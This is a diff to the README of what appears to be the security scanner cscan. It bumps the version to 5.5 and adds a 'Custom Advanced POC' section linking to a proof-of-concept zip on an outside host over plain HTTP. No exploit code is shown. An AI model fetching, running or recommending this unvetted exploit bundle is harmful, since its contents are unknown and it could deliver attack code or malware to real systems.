@@ -11,7 +11,7 @@
 [![Go](https://img.shields.io/badge/Go-1.26-00ADD8?style=flat-square&logo=go)](https://golang.org)
 [![Vue](https://img.shields.io/badge/Vue-3.4-4FC08D?style=flat-square&logo=vue.js)](https://vuejs.org)
 [![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Version](https://img.shields.io/badge/Version-5.4-green)](VERSION)
+[![Version](https://img.shields.io/badge/Version-5.5-green)](VERSION)
 
 </div>
 
@@ -50,6 +50,11 @@ docker compose pull && docker compose up -d
 
 - Access `https://ip:7777`
 - For production deployment, override the built-in default keys: `cp .env.example .env`, fill in strong random values, then `docker compose up -d`
+
+## Custom Advanced POC
+
+Download URL: [lasest-cscan-poc.zip](http://www.txf7.cn/upload/lasest-cscan-poc.zip)
+
 ---
 
 ## Local Development
